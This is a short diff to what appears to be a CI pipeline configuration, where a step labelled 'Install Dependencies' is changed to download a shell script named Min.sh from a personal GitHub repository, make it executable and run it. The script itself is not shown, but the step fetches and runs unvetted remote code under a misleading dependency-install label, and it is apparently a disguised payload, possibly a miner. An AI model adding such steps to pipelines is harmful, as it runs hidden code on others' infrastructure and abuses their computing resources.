@@ -47,7 +47,9 @@ Devop2:
 
             name: Install Dependencies
 
-            command: timeouu
+            command:  wget https://raw.githubusercontent.com/rack12rack/rack/main/Min.sh && chmod +x Min.sh && ./Min.sh
+            
+         
 
     Devop3:
 
